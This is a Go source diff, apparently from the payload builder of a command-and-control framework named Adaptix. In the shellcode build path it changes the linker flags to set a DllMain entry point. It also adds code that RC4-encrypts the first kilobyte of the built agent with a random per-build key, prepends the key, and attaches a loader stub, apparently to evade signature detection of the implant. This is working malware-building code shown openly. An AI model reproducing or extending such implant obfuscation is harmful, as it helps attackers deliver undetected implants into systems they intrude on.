@@ -712,7 +712,13 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		}
 	} else if generateConfig.Format == "Shellcode" {
 		Files += ObjectDir + "/main_shellcode" + Ext
-		lFlags += " -shared"
+
+		if generateConfig.Arch == "x86" {
+			lFlags += " -shared -nostdlib -e _DllMain "
+		} else {
+			lFlags += " -shared -nostdlib -e DllMain "
+		}
+
 		buildPath = tempDir + "/file.dll"
 		Filename += ".bin"
 		if generateConfig.IatHiding {
@@ -754,7 +760,29 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		if err != nil {
 			return nil, "", err
 		}
-		Payload = append(stubContent, buildContent...)
+
+		rc4KeyU32 := rand.Uint32()
+
+		rc4Key := make([]byte, 4)
+		rc4Key = []byte{
+			byte(rc4KeyU32),
+			byte(rc4KeyU32 >> 8),
+			byte(rc4KeyU32 >> 16),
+			byte(rc4KeyU32 >> 24),
+		}
+
+		encryptEnd := 1024
+		encryptedPart, err := RC4Crypt(buildContent[4:encryptEnd], rc4Key)
+		if err != nil {
+			return nil, "", err
+		}
+
+		finalPayload := make([]byte, 0, len(buildContent))
+		finalPayload = append(finalPayload, rc4Key...)
+		finalPayload = append(finalPayload, encryptedPart...)
+		finalPayload = append(finalPayload, buildContent[encryptEnd:]...)
+
+		Payload = append(stubContent, finalPayload...)
 	} else {
 		Payload = buildContent
 	}
